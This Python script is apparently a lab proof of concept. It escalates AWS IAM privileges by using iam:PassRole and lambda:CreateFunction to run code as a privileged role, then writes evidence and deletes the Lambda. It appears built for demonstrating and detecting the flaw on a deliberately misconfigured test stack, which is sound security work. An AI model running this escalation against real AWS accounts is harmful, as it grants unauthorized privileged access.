"""
Path 1 — IAM privilege escalation via iam:PassRole + lambda:CreateFunction.

Threat: an attacker who controls agent-exec-role turns its permissions into full
privileged-role access by creating a Lambda whose EXECUTION role is
privileged-role (FLAW 1a PassRole + FLAW 1b CreateFunction + FLAW 3 the privileged
role trusting lambda.amazonaws.com), then invoking it.

Proof of escalation: agent-exec-role is DENIED iam:ListRoles directly, but code it
launches as privileged-role performs iam:ListRoles successfully.

MITRE ATT&CK: T1548 (Abuse Elevation Control), T1078.004 (Valid Accounts: Cloud).

Runs entirely as the assumed agent-exec-role (so CloudTrail attributes the
CreateFunction / PassRole / Invoke to the agent — Phase-3 detection material).
Cleans up the Lambda it creates (nothing left for terraform destroy to miss).
"""

from __future__ import annotations

import io
import json
import sys
import time
import zipfile

import boto3
from datetime import datetime, timezone
from pathlib import Path

# import the shared AWS context from the agent package
sys.path.insert(0, str(Path(__file__).resolve().parents[2] / "agent"))
from awsctx import _terraform_outputs, assume_agent_session  # noqa: E402

FUNC_NAME = "cloudfracture-privesc-poc"
EVIDENCE_DIR = Path(__file__).resolve().parents[1] / "evidence" / "path1"

# Payload the escalated Lambda runs — an action agent-exec-role cannot perform.
LAMBDA_SRC = """
import boto3
def lambda_handler(event, context):
    sts = boto3.client("sts")
    iam = boto3.client("iam")
    ident = sts.get_caller_identity()
    roles = [r["RoleName"] for r in iam.list_roles(MaxItems=20).get("Roles", [])]
    return {
        "running_as": ident["Arn"],
        "account": ident["Account"],
        "iam_listroles_worked": True,
        "role_count": len(roles),
        "sample_roles": roles[:10],
    }
"""


def _zip_bytes() -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("lambda_function.py", LAMBDA_SRC)
    return buf.getvalue()


def main() -> int:
    tf = _terraform_outputs()
    agent_arn = tf.get("agent_exec_role_arn")
    priv_arn = tf.get("privileged_role_arn")
    if not (agent_arn and priv_arn):
        raise SystemExit("Missing terraform outputs. Is the stack applied?")

    evidence = {"attack": "path1-passrole-privesc",
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "agent_role": agent_arn, "privileged_role": priv_arn, "steps": {}}

    session = assume_agent_session(agent_arn, session_name="cf-attacker")
    who = session.client("sts").get_caller_identity()["Arn"]
    print(f"[*] operating as: {who}")
    evidence["operating_as"] = who

    # --- Step A: baseline — the agent role itself CANNOT read IAM -------------
    print("[*] Step A: as agent-exec-role, attempt iam:ListRoles (expect DENIED)")
    try:
        session.client("iam").list_roles(MaxItems=5)
        evidence["steps"]["A_agent_direct_iam"] = "UNEXPECTED: agent could list roles directly"
        print("    [!] unexpected: agent could list roles directly")
    except Exception as exc:
        code = getattr(exc, "response", {}).get("Error", {}).get("Code", type(exc).__name__)
        evidence["steps"]["A_agent_direct_iam"] = f"DENIED as expected ({code})"
        print(f"    [+] denied as expected: {code}")

    lam = session.client("lambda")
    try:
        # --- Step B: escalate — create a Lambda that RUNS AS privileged-role --
        print(f"[*] Step B: create Lambda {FUNC_NAME} with role={priv_arn} (PassRole + CreateFunction)")
        zip_bytes = _zip_bytes()
        last_err = None
        for attempt in range(12):  # tolerate IAM role-propagation delay
            try:
                lam.create_function(
                    FunctionName=FUNC_NAME, Runtime="python3.12", Role=priv_arn,
                    Handler="lambda_function.lambda_handler",
                    Code={"ZipFile": zip_bytes}, Timeout=30, Publish=True)
                last_err = None
                break
            except lam.exceptions.ResourceConflictException:
                last_err = None  # already exists from a prior run
                break
            except Exception as exc:  # InvalidParameterValueException while role propagates
                last_err = exc
                time.sleep(5)
        if last_err:
            raise last_err
        evidence["steps"]["B_create_function"] = "SUCCESS (agent passed privileged-role to a new Lambda)"
        print("    [+] function created — privileged-role passed to attacker-controlled code")

        # --- Step C: invoke — code now runs as privileged-role ---------------
        # NOTE: the agent role has InvokeFunction but NOT GetFunction (FLAW 1b is a
        # realistic partial set), so we can't use the function_active waiter. Invoke
        # with retry: a freshly-created function is briefly Pending and invoke raises
        # ResourceConflictException until it goes Active.
        print("[*] Step C: invoke the Lambda (runs as privileged-role)")
        payload = None
        for _ in range(18):
            try:
                resp = lam.invoke(FunctionName=FUNC_NAME, InvocationType="RequestResponse")
                payload = json.loads(resp["Payload"].read().decode())
                break
            except lam.exceptions.ResourceConflictException:
                time.sleep(5)  # still Pending
        if payload is None:
            raise RuntimeError("function never became invokable")
        evidence["steps"]["C_invoke_result"] = payload
        print("    [+] escalated execution result:")
        print(json.dumps(payload, indent=6))

        escalated = payload.get("running_as", "")
        proven = ("privileged-role" in escalated) and payload.get("iam_listroles_worked")
        evidence["escalation_proven"] = bool(proven)
        print(f"[{'+' if proven else '!'}] escalation proven: {proven}")

    finally:
        # --- Cleanup: remove the Lambda we created (not tracked by terraform) -
        # The agent role deliberately lacks lambda:DeleteFunction, so the operator
        # cleans up this out-of-band resource with the base (admin) credentials.
        # Leaving it would defeat `terraform destroy` (Constitution II).
        admin_lam = boto3.client("lambda")
        try:
            admin_lam.delete_function(FunctionName=FUNC_NAME)
            print("[*] cleanup: operator deleted the PoC Lambda")
            evidence["steps"]["cleanup"] = "operator (admin) deleted PoC lambda"
        except admin_lam.exceptions.ResourceNotFoundException:
            evidence["steps"]["cleanup"] = "already absent"
        except Exception as exc:
            print(f"[!] cleanup warning: could not delete {FUNC_NAME}: {exc}")
            evidence["steps"]["cleanup"] = f"WARN: {exc}"

    EVIDENCE_DIR.mkdir(parents=True, exist_ok=True)
    out = EVIDENCE_DIR / "evidence.json"
    out.write_text(json.dumps(evidence, indent=2), encoding="utf-8")
    print(f"[*] evidence written to {out}")
    return 0 if evidence.get("escalation_proven") else 1


if __name__ == "__main__":
    raise SystemExit(main())
